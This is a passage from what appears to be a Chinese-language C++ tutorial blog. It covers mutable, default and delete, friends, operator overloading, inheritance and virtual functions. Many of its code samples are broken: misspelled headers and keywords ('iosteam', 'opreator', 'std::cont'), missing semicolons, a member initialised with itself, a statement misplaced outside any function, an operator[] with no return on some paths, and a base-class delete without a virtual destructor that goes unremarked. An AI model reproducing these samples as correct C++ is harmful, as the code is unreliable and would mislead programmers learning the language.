 std::cout&lt;&lt;test.outPutCallCount&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个关键字在现代C++中使用情况并不多，一般来说只有在统计函数调用次数时才会用到。</p>
<p> (2) mutable关键字的注意事项</p>
<p>① mutable是一种万不得已的写法，一个程序不得不使用mutable关键字时，可以认为这部分程序是一个糟糕的设计。</p>
<p>② mutable不能修饰<strong>静态成员变量和常成员变量</strong>。</p>
<p>(3) <strong>总结：</strong>mutable关键字是一种没有办法的办法，设计时应该尽量避免，只有在统计函数调用次数这类情况下才推荐使用。</p>
<p><strong>3.default关键字</strong></p>
<p>(1) default关键字的作用：</p>
<p>① 在编译时不会生成默认构造函数时便于书写。</p>
<p>② 也可以对默认复制构造函数，默认的赋值运算符和默认的析构函数使用，表示使用的是系统默认提供的函数，这样可以使代码更加明显。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">Test</span>(<span class="type">unsigned</span> old_):<span class="built_in">old</span>(old_)&#123;&#125;</span><br><span class="line">    <span class="built_in">Test</span>() = <span class="keyword">default</span>;<span class="comment">//以前Test()&#123;&#125;</span></span><br><span class="line">	<span class="built_in">Test</span>(<span class="type">const</span> Test&amp; test)=<span class="keyword">default</span>;<span class="comment">//使用系统默认</span></span><br><span class="line">    Test&amp; <span class="keyword">operator</span>=(<span class="type">const</span> Test&amp; test)=<span class="keyword">default</span>;</span><br><span class="line">    ~<span class="built_in">Test</span>()=<span class="keyword">default</span>;</span><br><span class="line">	<span class="type">unsigned</span> old;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>③</strong> 现代C++中，哪怕没有构造函数，也推荐将构造函数用default关键字标记，可以让代码看起来更加直观，方便。</p>
<p>总结：default关键字还是推荐使用的，在现代C++代码中，如果需要使用一些默认的函数，推荐用default标记出来。</p>
<p><strong>4.delete关键字</strong></p>
<p>(1) Delete关键字的作用：C++会为程序生成默认构造函数，默认复制构造函数，默认重载赋值运算符。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//没有Test(unsigned old_):old(old_)&#123;&#125;，还不想默认生成</span></span><br><span class="line">    <span class="built_in">Test</span>()=<span class="keyword">delete</span>；</span><br><span class="line">    <span class="comment">//Test&amp; operator=(const Test&amp; test)=default;使用系统默认，不想使用就将default换成delete</span></span><br><span class="line">    ~<span class="built_in">Test</span>()=<span class="keyword">default</span>;<span class="comment">//一般不会delete</span></span><br><span class="line">	<span class="type">unsigned</span> old;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p> 在很多情况下，我们并不希望这些默认的函数被生成，在C++11以前，只能有将此函数声明为私有函数或是将函数只声明不定义两种方式。</p>
<p> C++11于是提供了delete关键字，只要在函数最后加上“&#x3D;delete”就可以明确告诉编译期不要默认生成该函数。</p>
<p> 总结：delete关键字还是推荐使用的，在现代C++代码中，如果不希望一些函数默认生成，就用delete表示，这个功能还是很有用的，比如在单例模式中。</p>
<h2 id="友元类和友元函数"><a href="#友元类和友元函数" class="headerlink" title="友元类和友元函数"></a>友元类和友元函数</h2><p>**1.**介绍：友元就是可以让另一个类或函数访问私有成员的简单写法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">Test2</span>;<span class="comment">//友元类</span></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">outPut</span><span class="params">(<span class="type">const</span> Test&amp; test)</span></span>;<span class="comment">//友元函数</span></span><br><span class="line"> <span class="keyword">private</span>:   </span><br><span class="line">    std::string name;</span><br><span class="line">    <span class="type">unsigned</span> old;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test2</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">outPut</span><span class="params">(<span class="type">const</span> Test&amp; test)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        std::cont&lt;&lt;test.name&lt;&lt;<span class="string">&quot;  &quot;</span>&lt;&lt;test.old&lt;&lt;std::endl;<span class="comment">//没有friend，类不能访问Test中的变量</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="function"><span class="type">void</span> <span class="title">outPut</span><span class="params">(<span class="type">const</span> Test&amp; test)</span><span class="comment">//上接友元函数</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        std::cont&lt;&lt;test.name&lt;&lt;<span class="string">&quot;  &quot;</span>&lt;&lt;test.old&lt;&lt;std::endl;<span class="comment">//没有friend，函数不能访问Test中的变量</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> **2.**注意：</p>
<p>(1) 友元会破坏<strong>封装性</strong>，一般不推荐使用，所带来的方便写几个接口函数就解决了。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function">std::string <span class="title">getName</span><span class="params">()</span><span class="type">const</span></span>&#123;<span class="keyword">return</span> name;&#125;;<span class="comment">//</span></span><br><span class="line">    <span class="function"><span class="type">unsigned</span> <span class="title">getOld</span><span class="params">()</span><span class="type">const</span></span>&#123;<span class="keyword">return</span> old;&#125;;<span class="comment">//接口</span></span><br><span class="line"> <span class="keyword">private</span>:  </span><br><span class="line">    std::string name;</span><br><span class="line">    <span class="type">unsigned</span> old;</span><br><span class="line">&#125;<span class="comment">//同样效果</span></span><br></pre></td></tr></table></figure>

<p><strong>(2)</strong> 某些运算符的<strong>重载</strong>必须用到友元的功能，这才是友元的真正用途。</p>
<p> **3.**大佬说：友元平常并不推荐使用，新手不要再纠结友元的语法了，只要可以用友元写出必须用友元的重载运算符就可以了。</p>
<h2 id="重载运算符"><a href="#重载运算符" class="headerlink" title="(**)重载运算符"></a>(**)重载运算符</h2><p><strong>重载运算符在整个C++中拥有非常重要的地位</strong></p>
<p><strong>1.重载运算符的作用：</strong></p>
<p>(1) 很多时候我们想让类对象也能像基础类型的对象一样进行作基础操作，比如“+”，“-”，“*”，“\”，也可以使用某些运算符“&#x3D;”，“()”，“[]”,“&lt;&lt;”，“&gt;&gt;”。但是一般的类即使编译器可以识别这些运算符，类对象也无法对这些运算符做出应对，我们必须对类对象定义处理这些运算符的方式。</p>
<p>(2) C++提供了定义这些行为的方式，就是<strong>operator 运算符</strong>来定义运算符的行为，operator是一个关键字，告诉编译器我要重载运算符了。</p>
<p> <strong>2.注意：</strong></p>
<p>(1) 我们只能重载C++已有的运算符，所有无法将“<strong>”这个运算符定义为指数的形式，因为C++根本没有“</strong>”这个运算符。</p>
<p>(2) C++重载运算符不能改变运算符的<strong>元数</strong>，“元数”这个概念就是指一个运算符对应的对象数量，比如“+”必须为“a + b”，也就是说“+”必须有两个对象，那么“+”就是二元运算符。比如“++”运算符，必须写为“a++”，也就是一元运算符。</p>
<p> <strong>3.重载运算符举例</strong></p>
<p>(1) 一元运算符重载</p>
<p>① “++”，“–”</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iosteam&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="type">void</span> opterator++()</span><br><span class="line">    &#123;</span><br><span class="line">        ++count;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">void</span> opterator--()</span><br><span class="line">    &#123;</span><br><span class="line">        --count;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> count = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Test test;</span><br><span class="line">    ++test;</span><br><span class="line">    std::cout&lt;&lt;test.count&lt;&lt;std::endl;</span><br><span class="line">    --test;</span><br><span class="line">    std::cout&lt;&lt;test.count&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>② “[]”</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iosteam&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span><span class="comment">//容器</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> <span class="keyword">operator</span>[](<span class="type">unsigned</span> i)<span class="type">const</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i&gt;<span class="number">0</span>&amp;&amp;i&lt;ivec.size)</span><br><span class="line">            <span class="keyword">return</span> ivec[i];</span><br><span class="line">    &#125;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; ivec&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Test test;</span><br><span class="line">    std::cout&lt;&lt;test[<span class="number">3</span>]&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>③ “()”</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iosteam&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;hello world&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> std::string&amp; str)</span><span class="type">const</span><span class="comment">//可以重载</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        std::cout&lt;&lt;str&lt;&lt;std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Test test;</span><br><span class="line">    <span class="built_in">test</span>();<span class="comment">//输出hello world</span></span><br><span class="line">    <span class="built_in">test</span>(<span class="string">&quot;abcde&quot;</span>)<span class="comment">//输出abcde</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>④ “&lt;&lt;”，“&gt;&gt;”</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iosteam&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;<span class="comment">//记住怎么写</span></span><br><span class="line">  <span class="keyword">friend</span> std::ostream&amp; <span class="keyword">operator</span>&lt;&lt; (std::ostream&amp; os,<span class="type">const</span> Test&amp; test);</span><br><span class="line">  <span class="keyword">friend</span> std::istream&amp; <span class="keyword">operator</span>&gt;&gt; (std::istream&amp; os,Test&amp; test);</span><br><span class="line">&#125;</span><br><span class="line">std::ostream&amp; <span class="keyword">operator</span>&lt;&lt; (std::ostream&amp; os,<span class="type">const</span> Test&amp; test)</span><br><span class="line">&#123;</span><br><span class="line">    os&lt;&lt;test.name&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> os;<span class="comment">//返回ostream的引用</span></span><br><span class="line">&#125;</span><br><span class="line">std::istream&amp; <span class="keyword">operator</span>&gt;&gt; (std::istream&amp; os,Test&amp; test)</span><br><span class="line">&#123;</span><br><span class="line">    is &gt;&gt;test.name;</span><br><span class="line">    <span class="keyword">return</span> is;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Test test;</span><br><span class="line">    std::cin&gt;&gt;test;</span><br><span class="line">    std::cout&lt;&lt;test&lt;&lt;std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>(2) 二元运算符重载</p>
<p>① “+”，“-”，“*”，“&#x2F;”</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iosteam&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    Test opreator+(<span class="type">const</span> Test&amp; test)</span><br><span class="line">    &#123;</span><br><span class="line">        count +=test.count;</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> count = <span class="number">0</span>;</span><br><span class="line">    std::string name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Test test;</span><br><span class="line">    std::cout&lt;&lt;test.count&lt;&lt;std::endl;<span class="comment">//输出0</span></span><br><span class="line">    Test test2;</span><br><span class="line">    test2.count=<span class="number">20</span>;</span><br><span class="line">    Test test3=+test2;</span><br><span class="line">    std::test3&lt;&lt;test3.count&lt;&lt;std::endl;<span class="comment">//输出20</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>② “&#x3D;”，</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iosteam&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    Test&amp; opreator=(<span class="type">const</span> Test&amp; test)<span class="comment">//使用引用的原因是返回的还是自己</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>==&amp;test)<span class="comment">//地址相同</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        count =test.count;</span><br><span class="line">        name=test.name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Test&amp; opterator= (const Test&amp; test)=default 默认重载</span></span><br><span class="line">    <span class="type">unsigned</span> count = <span class="number">0</span>;</span><br><span class="line">    std::string name;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>；</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="built_in">main</span>()</span><br><span class="line">&#123;</span><br><span class="line">    Test test;</span><br><span class="line">    Test test2;</span><br><span class="line">    test=test2;<span class="comment">//返回是是自己，所以要用引用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>③ “&gt;”，“&lt;”，“&#x3D;&#x3D;”</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>&lt; (<span class="type">const</span> Test&amp; test)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> count&lt;test.count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 至于唯一的三元运算符“?:”，不能重载</p>
<p>(3) 类类型转化运算符：“operator 类型”</p>
<p>(4) 特殊的运算符：new，delete，new[]，delete[]</p>
<p> 注意：“&#x3D;”类会默认进行重载，如果不需要可以用“delete关键字进行修饰”。</p>
<p> <strong>总结：重载运算符非常重要，C++类中几乎都要定义各种各种的重载运算符。</strong></p>
<h2 id="普通继承及其实现原理"><a href="#普通继承及其实现原理" class="headerlink" title="(*)普通继承及其实现原理"></a>(*)普通继承及其实现原理</h2><p><strong>C++面向对象的三大特性：分装，继承，多态。分装就是类的权限管理，很简单，就不讲了。继承这节课讲，继承很重要，有些地方也是需要重点理解的。</strong></p>
<p> **1.**C++继承介绍：C++非继承的类相互是没有关联性的，假设现在需要设计医生，教师，公务员三个类，需要定义很多重复的内容而且相互没有关联，调用也没有规律。如果这还算好，那一个游戏有几千件物品，调用时也要写几千个函数。这太要命了。于是继承能力就应运而生了。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="comment">//class FireSpear麻烦</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//   std::string name;</span></span><br><span class="line"><span class="comment">//    std::string icon;</span></span><br><span class="line"><span class="comment">//&#125;;</span></span><br><span class="line"><span class="comment">//class IceSpear</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//   std::string name;</span></span><br><span class="line"><span class="comment">//   std::string icon;</span></span><br><span class="line"><span class="comment">//&#125;;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Spear</span><span class="comment">//父类</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">protected</span>:<span class="comment">//外界无法访问。但是子类继承到，可以访问</span></span><br><span class="line">        std::string name;</span><br><span class="line">        std::string icon;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Spear</span>(<span class="type">const</span> std::string&amp; name_,<span class="type">const</span> std:: string&amp; icon_):<span class="built_in">name</span>(name_),<span class="built_in">icon</span>(icon_)</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;Spear()&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FireSpear</span>: <span class="keyword">public</span> Spear</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">FireSpear</span>(<span class="type">const</span> std::string&amp; name_,<span class="type">const</span> std:: string&amp; icon_,<span class="type">int</span> i_):<span class="built_in">Spear</span>(name_,icon_),<span class="built_in">i</span>(i)</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;FireSpear()&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">    &#125;<span class="comment">//先初始化父类的部分，在初始化子类的部分</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IceSpear</span>: <span class="keyword">public</span> Spear</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>**2.**C++继承原理：C++的继承可以理解为在创建子类成员变量之前先创建父类的成员变量，实际上，C语言就是这么模仿出继承功能的。</p>
<p>**3.**C++继承的注意事项。</p>
<p>(1) C++子类对象的构造过程。先调用父类的构造函数，再调用子类的构造函数，也就是说先初始化父类的成员，再初始化子类的成员。</p>
<p>(2) 若父类没有默认的构造函数，子类的构造函数又未调用父类的构造函数，则无法编译。</p>
<p>(3) C++子类对象的析构过程。先调用子类的析构函数，再调用父类的析构函数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Spear</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Spear</span>(<span class="type">const</span> std::string&amp; name_, <span class="type">const</span> std::string&amp; icon_) :<span class="built_in">name</span>(name_), <span class="built_in">icon</span>(icon_)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;Spear()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	~<span class="built_in">Spear</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;~Spear()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	 <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">openFire</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;Spear::openFire&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	std::string name;</span><br><span class="line">	std::string icon;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FireSpear</span> :<span class="keyword">public</span> Spear</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">FireSpear</span>(<span class="type">const</span> std::string&amp; name_, <span class="type">const</span> std::string&amp; icon_, <span class="type">int</span> i_) :<span class="built_in">Spear</span>(name_, icon_), <span class="built_in">i</span>(i)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;FireSpear()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	~<span class="built_in">FireSpear</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;~FireSpear()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IceSpear</span>: <span class="keyword">public</span> Spear</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">openFire</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;IceSpear::openFire&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">openFire</span><span class="params">(<span class="type">const</span> Spear* pSpear)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pSpear-&gt;<span class="built_in">openFire</span>();</span><br><span class="line">	<span class="keyword">delete</span> pSpear;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">FireSpear <span class="title">fireSpear</span><span class="params">(<span class="string">&quot;fanfan&quot;</span>, <span class="string">&quot;sad&quot;</span>, <span class="number">9</span>)</span></span>;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;-------------------&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="built_in">openFire</span>(<span class="keyword">new</span> <span class="built_in">FireSpear</span>(<span class="string">&quot;fanfan&quot;</span>, <span class="string">&quot;love&quot;</span>, <span class="number">10</span>));</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;-------------------&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Spear()</span><br><span class="line">FireSpear()</span><br><span class="line">-------------------</span><br><span class="line">Spear()</span><br><span class="line">FireSpear()</span><br><span class="line">Spear::openFire</span><br><span class="line">~Spear()</span><br><span class="line">-------------------</span><br><span class="line">~FireSpear()</span><br><span class="line">~Spear()</span><br></pre></td></tr></table></figure>



<p>总结：面向对象三大特性的继承就这么简单，很多人觉得类继承很复杂，其实完全不是这样的，只要明白子类在内存上其实就相当于把父类的成员变量放在子类的成员变量前面罢了。构造和析构过程也是为了这个机制而设计的。</p>
<h2 id="虚函数及其实现原理，override-关键字"><a href="#虚函数及其实现原理，override-关键字" class="headerlink" title="(**)虚函数及其实现原理，override 关键字"></a>(**)虚函数及其实现原理，override 关键字</h2><p><strong>1.虚函数介绍：</strong></p>
<p>(1) 虚函数就是面向对象的第三大特点：<strong>多态</strong>。多态非常的重要，它完美解决了上一课设计游戏装备类的问题，我们可以只设计一个函数，函数参数是基类指针，就可以调用子类的功能。比如射击游戏，所有的枪都继承自一个枪的基类，人类只要有一个开枪的函数就可以实现所有枪打出不同的子弹。</p>
<p>(2) 父类指针可以指向子类对象，这个是自然而然的，<strong>因为子类对象的内存前面就是父类成员，类型完全匹配。</strong></p>
<p>(3) 当父类指针指向子类对象，且子类重写父类某一函数时。父类指针调用该函数，就会产生以下的可能</p>
<p><strong>①</strong> <strong>该函数为虚函数：父类指针调用的是子类的成员函数。</strong></p>
<p><strong>②</strong> <strong>该函数不是虚函数：父类指针调用的是父类的成员函数。</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Spear</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Spear</span>(<span class="type">const</span> std::string&amp; name_, <span class="type">const</span> std::string&amp; icon_) :<span class="built_in">name</span>(name_), <span class="built_in">icon</span>(icon_)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;Spear()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	~<span class="built_in">Spear</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;~Spear()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	 <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">openFire</span><span class="params">()</span><span class="type">const</span><span class="comment">//</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;Spear::openFire&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	std::string name;</span><br><span class="line">	std::string icon;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FireSpear</span> :<span class="keyword">public</span> Spear</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">FireSpear</span>(<span class="type">const</span> std::string&amp; name_, <span class="type">const</span> std::string&amp; icon_, <span class="type">int</span> i_) :<span class="built_in">Spear</span>(name_, icon_), <span class="built_in">i</span>(i)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;FireSpear()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">virtual</span> ~<span class="built_in">FireSpear</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;~FireSpear()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">openFire</span><span class="params">()</span><span class="type">const</span> <span class="keyword">override</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;FireSpear::openFire&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IceSpear</span>: <span class="keyword">public</span> Spear</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">openFire</span><span class="params">()</span><span class="type">const</span><span class="comment">//加了virtual动态绑定</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		std::cout &lt;&lt; <span 